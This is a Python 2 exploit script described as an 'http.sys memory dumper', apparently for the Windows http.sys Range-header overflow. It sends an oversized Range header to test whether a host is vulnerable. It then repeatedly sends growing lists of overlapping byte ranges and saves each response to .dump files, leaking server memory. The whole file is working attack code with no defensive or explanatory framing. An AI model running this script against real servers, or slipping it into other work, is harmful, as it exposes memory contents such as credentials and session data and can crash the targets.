import errno
import time
import sys
import os
import math
import argparse
import requests



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='http.sys memory dumper')

    parser.add_argument('--host', required=True, action="store", dest='host')
    parser.add_argument('--uri', action="store", dest='uri', default="favicon.ico")
    parser.add_argument('--port', action="store", dest="port", type=int, default=None)
    parser.add_argument('--ssl', action="store_true", dest="ssl", default=None)
    parser.add_argument('--cookie', action="store", default="123")
    parser.add_argument('--outdir', action="store", dest="outdir", default='data')
    parser.add_argument('--check', action='store_true', dest="check")
    parser.set_defaults(check=False)
    cmd_options = parser.parse_args()
  
    if not os.path.exists(cmd_options.outdir):
        os.makedirs(cmd_options.outdir)

    url = ""
    if cmd_options.ssl is True:
        url = "https://"
        if cmd_options.port is None:
            cmd_options.port = 443
    else:
        url = "http://"
        if cmd_options.port is None:
            cmd_options.port = 80    
    url += "{}:{}/{}".format(cmd_options.host,cmd_options.port,cmd_options.uri)
    headers = {"Range":"bytes=0-18446744073709551615"}
    r = requests.get(url, headers=headers, verify=False)
    if not "Requested Range Not Satisfiable" in r.reason:
        print "[-] {}:{} is not vulnerable".format(cmd_options.host,cmd_options.port)
        sys.exit(0)
    elif "The request has an invalid header name" in r.text:
        print "[-] {}:{} is not vulnerable".format(cmd_options.host,cmd_options.port)
        sys.exit(0)                
    if (cmd_options.check is True):
        print "[+] {}:{} is vulnerable".format(cmd_options.host,cmd_options.port)
        sys.exit(0)

    range_chunk = "1-18446744073709551615"  
    range_header = "bytes=1-18446744073709551615,2-18446744073709551615"
    while True:
        headers = {"Range":range_header}
        r = requests.get(url, headers=headers, verify=False)
        with open(cmd_options.outdir + '/' + str(int(time.time())) + '.dump', 'wb') as file_:
            for chunk in r.iter_content(1024):
                file_.write(chunk)
        if "The size of the request headers is too long" not in r.text:
            range_header += ","
            range_header += range_chunk     
        else:
            print "Max header length reached"
            sys.exit(0)